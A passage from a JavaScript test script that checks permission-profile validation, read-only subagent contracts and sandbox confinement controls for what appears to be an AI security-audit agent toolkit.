  // Arbitrary unconstrained shell commands allowed in coordinator
  const arbCmdCoord119 = JSON.parse(JSON.stringify(prof119));
  arbCmdCoord119.roles.coordinator.allow.push('run_command:*');
  if (validatePermissionsProfile(arbCmdCoord119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted arbitrary run_command:* in coordinator role');
  }

  // CI/CD manifest modification not denied in remediation
  const noGithubDeny119 = JSON.parse(JSON.stringify(prof119));
  noGithubDeny119.roles.remediation.deny = noGithubDeny119.roles.remediation.deny.filter(x => !x.includes('.github'));
  if (validatePermissionsProfile(noGithubDeny119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted remediation without CI/CD .github deny');
  }

  // Missing defenseInDepth layers
  const badDid119 = JSON.parse(JSON.stringify(prof119));
  delete badDid119.defenseInDepth.layer1_terminal_sandbox;
  if (validatePermissionsProfile(badDid119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted missing defenseInDepth layer');
  }

  // 119.2 Schema presence & structural validity
  const schemaPath119 = path.resolve(process.cwd(), 'schemas/permissions-profile.schema.json');
  if (!fs.existsSync(schemaPath119)) {
    throw new Error('P0-119 VIOLATION: schemas/permissions-profile.schema.json missing');
  }
  const schemaParsed119 = JSON.parse(fs.readFileSync(schemaPath119, 'utf8'));
  if (schemaParsed119.$schema !== 'http://json-schema.org/draft-07/schema#' || !schemaParsed119.properties?.defenseInDepth || !schemaParsed119.properties?.roles) {
    throw new Error('P0-119 VIOLATION: schemas/permissions-profile.schema.json is not valid Draft-07 schema');
  }

  // 119.3 SECURITY.md 4-layer defense-in-depth documentation
  const secPath119 = path.resolve(process.cwd(), 'SECURITY.md');
  const secContent119 = fs.readFileSync(secPath119, 'utf8');
  if (!secContent119.includes('### 2.8 4-Layer Defense-in-Depth Execution Model') ||
      !secContent119.includes('Layer 1: Terminal Sandbox') ||
      !secContent119.includes('Layer 2: Permission Engine') ||
      !secContent119.includes('Layer 3: Shadow Context Guard') ||
      !secContent119.includes('Layer 4: Deterministic Path Containment & TOCTOU-Resistant TCB')) {
    throw new Error('P0-119 VIOLATION: SECURITY.md missing complete 4-layer defense-in-depth specification');
  }

  // 119.4 validateBenchmarkRunEnvelope sandboxEnabled validation
  const testEnvelope119 = JSON.parse(JSON.stringify(envelopeWithTelem));
  testEnvelope119.executionTelemetry.sandboxEnabled = true;
  const envValRes119 = validateBenchmarkRunEnvelope(testEnvelope119);
  if (!envValRes119.valid) {
    throw new Error(`P0-119 VIOLATION: validateBenchmarkRunEnvelope rejected sandboxEnabled: true: ${envValRes119.errors.join('; ')}`);
  }
  testEnvelope119.executionTelemetry.sandboxEnabled = 'not-a-boolean';
  const badEnvValRes119 = validateBenchmarkRunEnvelope(testEnvelope119);
  if (badEnvValRes119.valid) {
    throw new Error('P0-119 VIOLATION: validateBenchmarkRunEnvelope accepted non-boolean sandboxEnabled');
  }

  console.log('✔ 119. P0 Invariant: Recommended Role Permissions Profile & 4-Layer Defense-in-Depth Sandbox Model.');

  // ---------------------------------------------------------------------------
  // 120. P0 Invariant: AGY Custom-Agent Contract Conformance & Native Frontmatter Validation
  // ---------------------------------------------------------------------------
  const agentsDir120 = path.resolve(process.cwd(), 'agents');
  const allAgentsRes120 = validateAllAgentContracts(agentsDir120);
  if (!allAgentsRes120.valid) {
    throw new Error(`P0-120 VIOLATION: Agent contracts validation failed: ${allAgentsRes120.errors.join('; ')}`);
  }

  // Iterate over all .md files in agents/ and verify contracts
  const allMdFiles120 = fs.readdirSync(agentsDir120).filter(f => f.endsWith('.md')).sort();
  const expectedSubagents120 = [
    'discovery-agent.md',
    'threat-modeler.md',
    'verifier-reachability.md',
    'verifier-defenses.md',
    'verifier-impact.md'
  ];

  let mainCount120 = 0;
  for (const agentFile of allMdFiles120) {
    const agentPath = path.join(agentsDir120, agentFile);
    const parsed = parseAgentFrontmatter(fs.readFileSync(agentPath, 'utf8'));
    if (!parsed) {
      throw new Error(`P0-120 VIOLATION: Could not parse frontmatter in ${agentFile}`);
    }
    if (agentFile === 'security-audit-coordinator.md') {
      mainCount120++;
      if (parsed.mainAgent !== true || parsed.subagent !== false) {
        throw new Error(`P0-120 VIOLATION: ${agentFile} must have mainAgent: true and subagent: false`);
      }
      if (parsed.commandExecutionPolicy !== 'sandbox') {
        throw new Error(`P0-120 VIOLATION: ${agentFile} must have commandExecutionPolicy: sandbox`);
      }
      if (parsed.name !== 'security-audit-coordinator') {
        throw new Error(`P0-120 VIOLATION: ${agentFile} must have name: security-audit-coordinator`);
      }
    } else {
      if (!expectedSubagents120.includes(agentFile)) {
        throw new Error(`P0-120 VIOLATION: Unexpected agent file ${agentFile} in agents/`);
      }
      if (parsed.mainAgent !== false || parsed.subagent !== true) {
        throw new Error(`P0-120 VIOLATION: ${agentFile} must have mainAgent: false and subagent: true`);
      }
      if (parsed.commandExecutionPolicy !== 'off') {
        throw new Error(`P0-120 VIOLATION: ${agentFile} must have commandExecutionPolicy: off`);
      }
      const allowedSubTools = new Set(['view_file', 'list_dir', 'grep_search', 'find_by_name']);
      for (const t of parsed.tools || []) {
        if (!allowedSubTools.has(t)) {
          throw new Error(`P0-120 VIOLATION: ${agentFile} contains non-readonly tool '${t}'`);
        }
      }
    }
  }

  if (mainCount120 !== 1) {
    throw new Error(`P0-120 VIOLATION: Exactly one coordinator required, found ${mainCount120}`);
  }

  // Fail-closed tamper tests against frontmatter violations
  // 1. Invalid policy enum
  const badPolicyAgent = {
    name: 'discovery-agent',
    mainAgent: false,
    subagent: true,
    commandExecutionPolicy: 'invalid-policy',
    tools: ['view_file']
  };
  if (validateAgentContract(badPolicyAgent, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted invalid commandExecutionPolicy enum');
  }

  // 2. Subagent declaring mainAgent: true
  const subagentAsMain = {
    name: 'discovery-agent',
    mainAgent: true,
    subagent: false,
    commandExecutionPolicy: 'off',
    tools: ['view_file']
  };
  if (validateAgentContract(subagentAsMain, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted subagent declaring mainAgent: true');
  }

  // 3. Subagent allowing run_command (including zero-indent syntax)
  const subagentWithCmd = {
    name: 'discovery-agent',
    mainAgent: false,
    subagent: true,
    commandExecutionPolicy: 'off',
    tools: ['view_file', 'run_command']
  };
  if (validateAgentContract(subagentWithCmd, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted subagent with run_command');
  }
  const zeroIndentCmdParsed = parseAgentFrontmatter('---\nname: discovery-agent\nmainAgent: false\nsubagent: true\ncommandExecutionPolicy: off\ntools:\n- view_file\n- run_command\n---\n');
  if (!zeroIndentCmdParsed || validateAgentContract(zeroIndentCmdParsed, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: Zero-indent run_command bypassed frontmatter validation');
  }

  // 4. Subagent allowing write tools
  const subagentWithWrite = {
    name: 'discovery-agent',
    mainAgent: false,
    subagent: true,
    commandExecutionPolicy: 'off',
    tools: ['view_file', 'write_to_file']
  };
  if (validateAgentContract(subagentWithWrite, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted subagent with write_to_file');
  }

  const subagentWithReplace = {
    name: 'discovery-agent',
    mainAgent: false,
    subagent: true,
    commandExecutionPolicy: 'off',
    tools: ['view_file', 'replace_file_content']
  };
  if (validateAgentContract(subagentWithReplace, 'discovery-agent.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted subagent with replace_file_content');
  }

  // 5. Coordinator without sandbox policy
  const coordBadPolicy = {
    name: 'security-audit-coordinator',
    mainAgent: true,
    subagent: false,
    commandExecutionPolicy: 'off',
    tools: ['invoke_subagent', 'send_message', 'manage_subagents', 'view_file', 'list_dir', 'run_command']
  };
  if (validateAgentContract(coordBadPolicy, 'security-audit-coordinator.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted coordinator with commandExecutionPolicy: off');
  }

  // 6. Coordinator missing required orchestration tools
  const coordMissingTools = {
    name: 'security-audit-coordinator',
    mainAgent: true,
    subagent: false,
    commandExecutionPolicy: 'sandbox',
    tools: ['view_file', 'list_dir']
  };
  if (validateAgentContract(coordMissingTools, 'security-audit-coordinator.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted coordinator missing required orchestration tools');
  }

  // 7. Coordinator with invalid name inside coordinator file
  const coordWrongName = {
    name: 'rogue-coordinator',
    mainAgent: true,
    subagent: false,
    commandExecutionPolicy: 'sandbox',
    tools: ['invoke_subagent', 'send_message', 'manage_subagents', 'view_file', 'list_dir', 'run_command']
  };
  if (validateAgentContract(coordWrongName, 'security-audit-coordinator.md').valid) {
    throw new Error('P0-120 VIOLATION: validateAgentContract accepted rogue coordinator name');
  }

  // 8. Duplicate YAML frontmatter keys rejected fail-closed
  const dupKeyParsed = parseAgentFrontmatter('---\nname: discovery-agent\nmainAgent: false\nmainAgent: true\nsubagent: true\ncommandExecutionPolicy: off\ntools:\n  - view_file\n---\n');
  if (dupKeyParsed !== null) {
    throw new Error('P0-120 VIOLATION: parseAgentFrontmatter accepted duplicate mapping keys');
  }

  // 9. Directory-level tamper test: duplicate mainAgent rejected
  const fakeAgentsDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-agents-tamper-'));
  try {
    fs.writeFileSync(path.join(fakeAgentsDir, 'agent-1.md'), '---\nname: agent-1\nmainAgent: true\nsubagent: false\ncommandExecutionPolicy: sandbox\ntools:\n  - invoke_subagent\n  - send_message\n  - manage_subagents\n  - view_file\n  - list_dir\n  - run_command\n---\n', 'utf8');
    fs.writeFileSync(path.join(fakeAgentsDir, 'agent-2.md'), '---\nname: agent-2\nmainAgent: true\nsubagent: false\ncommandExecutionPolicy: sandbox\ntools:\n  - invoke_subagent\n  - send_message\n  - manage_subagents\n  - view_file\n  - list_dir\n  - run_command\n---\n', 'utf8');
    const dupRes = validateAllAgentContracts(fakeAgentsDir);
    if (dupRes.valid) {
      throw new Error('P0-120 VIOLATION: validateAllAgentContracts accepted multiple mainAgents');
    }
  } finally {
    fs.rmSync(fakeAgentsDir, { recursive: true, force: true });
  }

  // 10. Directory-level tamper test: missing subagents rejected fail-closed
  const missingSubDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-agents-missing-'));
  try {
    fs.writeFileSync(path.join(missingSubDir, 'security-audit-coordinator.md'), '---\nname: security-audit-coordinator\nmainAgent: true\nsubagent: false\ncommandExecutionPolicy: sandbox\ntools:\n  - invoke_subagent\n  - send_message\n  - manage_subagents\n  - view_file\n  - list_dir\n  - run_command\n---\n', 'utf8');
    const missingRes = validateAllAgentContracts(missingSubDir);
    if (missingRes.valid) {
      throw new Error('P0-120 VIOLATION: validateAllAgentContracts accepted directory missing mandatory subagents');
    }
  } finally {
    fs.rmSync(missingSubDir, { recursive: true, force: true });
  }

  console.log('✔ 120. P0 Invariant: AGY Custom-Agent Contract Conformance & Native Frontmatter Validation.');

  // ---------------------------------------------------------------------------
  // 121. P0 Invariant: G6 Dual-Control Runtime Confinement Matrix & Subprocess Calling Contract Verification
  // ---------------------------------------------------------------------------
  const runMatrixScript121 = path.resolve(process.cwd(), 'scripts/run-confinement-matrix.mjs');
  const testConfinementScript121 = path.resolve(process.cwd(), 'scripts/test-runtime-confinement.mjs');
  const hooksConfigPath121 = path.resolve(process.cwd(), 'hooks.json');
  const guardHookPath121 = path.resolve(process.cwd(), 'hooks/shadow-context-guard.mjs');

  if (!fs.existsSync(runMatrixScript121)) {
    throw new Error('P0-121 VIOLATION: scripts/run-confinement-matrix.mjs does not exist');
  }
  if (!fs.existsSync(testConfinementScript121)) {
    throw new Error('P0-121 VIOLATION: scripts/test-runtime-confinement.mjs does not exist');
  }
  if (!fs.existsSync(hooksConfigPath121)) {
    throw new Error('P0-121 VIOLATION: hooks.json does not exist');
  }
  if (!fs.existsSync(guardHookPath121)) {
    throw new Error('P0-121 VIOLATION: hooks/shadow-context-guard.mjs does not exist');
  }

  // 1. Verify hooks.json configures PreToolUse hook covering all 5 control surfaces
  const hooksRaw121 = fs.readFileSync(hooksConfigPath121, 'utf8');
  const hooksConfig121 = JSON.parse(hooksRaw121);
  const guardGroup121 = hooksConfig121['shadow-context-guard'];
  const preToolHooks121 = guardGroup121?.PreToolUse;
  if (!Array.isArray(preToolHooks121) || preToolHooks121.length === 0) {
    throw new Error('P0-121 VIOLATION: hooks.json does not define any PreToolUse hooks');
  }
  const preToolEntry121 = preToolHooks121[0];
  const matcherPattern121 = preToolEntry121.matcher || '';
  const command121 = preToolEntry121.hooks?.[0]?.command || '';
  if (!command121.includes('shadow-context-guard.mjs')) {
    throw new Error('P0-121 VIOLATION: hooks.json missing shadow-context-guard.mjs in command');
  }
  const requiredMatcherTools121 = [
    'view_file', 'grep_search', 'list_dir', 'find_by_name',
    'search_web', 'read_url_content', 'read_browser_page', 'call_mcp_tool',
    'write_to_file', 'replace_file_content', 'invoke_subagent', 'run_command'
  ];
  for (const tool of requiredMatcherTools121) {
    if (!matcherPattern121.includes(tool)) {
      throw new Error(`P0-121 VIOLATION: hooks.json matcher missing tool '${tool}'`);
    }
  }

  // 2. Dynamic check of hooks/shadow-context-guard.mjs tool categories
  const guardCode121 = fs.readFileSync(guardHookPath121, 'utf8');
  const requiredExports121 = ['READ_TOOLS', 'NETWORK_TOOLS', 'WRITE_TOOLS', 'SUBAGENT_TOOLS', 'COMMAND_TOOLS', 'SUPPORTED_TOOLS'];
  for (const exp of requiredExports121) {
    if (!guardCode121.includes(`export const ${exp}`)) {
      throw new Error(`P0-121 VIOLATION: hooks/shadow-context-guard.mjs does not export ${exp}`);
    }
  }

  // 3. Execute scripts/test-runtime-confinement.mjs
  try {
    const testOutput121 = execFileSync(process.execPath, [testConfinementScript121], {
      cwd: process.cwd(),
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe']
    });
    if (!testOutput121.includes('All Milestone G6 Runtime Confinement Matrix tests passed successfully.')) {
      throw new Error('P0-121 VIOLATION: test-runtime-confinement did not report complete success');
    }
  } catch (err) {
    throw new Error(`P0-121 VIOLATION: scripts/test-runtime-confinement.mjs execution failed: ${err.message}`);
  }

  // 4. Execute scripts/run-confinement-matrix.mjs --test
  try {
    const matrixOutput121 = execFileSync(process.execPath, [runMatrixScript121, '--test'], {
      cwd: process.cwd(),
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe']
    });
    const expectedControls121 = [
      'ALLOW_SHADOW_READ',
      'DENY_RAW_REPO_READ',
      'DENY_NETWORK_EXFILTRATION',
      'DENY_ARBITRARY_FS_WRITE',
      'DENY_SUBAGENT_RECURSION'
    ];
    for (const ctrl of expectedControls121) {
      if (!matrixOutput121.includes(ctrl)) {
        throw new Error(`P0-121 VIOLATION: run-confinement-matrix output missing control ${ctrl}`);
      }
    }
    if (!matrixOutput121.includes('All 5 G6 confinement controls passed self-test.')) {
      throw new Error('P0-121 VIOLATION: run-confinement-matrix did not report 5/5 controls passed self-test');
    }
  } catch (err) {
    throw new Error(`P0-121 VIOLATION: scripts/run-confinement-matrix.mjs --test execution failed: ${err.message}`);
  }

  console.log('✔ 121. P0 Invariant: G6 Dual-Control Runtime Confinement Matrix & Subprocess Calling Contract Verification.');

  console.log('\nAll render-sarif.mjs automated verification tests passed successfully (121/121).');

  } finally {
    gitFixture.cleanup();
  }
}



if (process.argv[1] && process.argv[1].endsWith('test-render-sarif.mjs')) {
  try {
    runTests();
    process.exit(0);
  } catch (err) {
    console.error('❌ Test failure:', err.message);
    process.exit(1);
  }
}

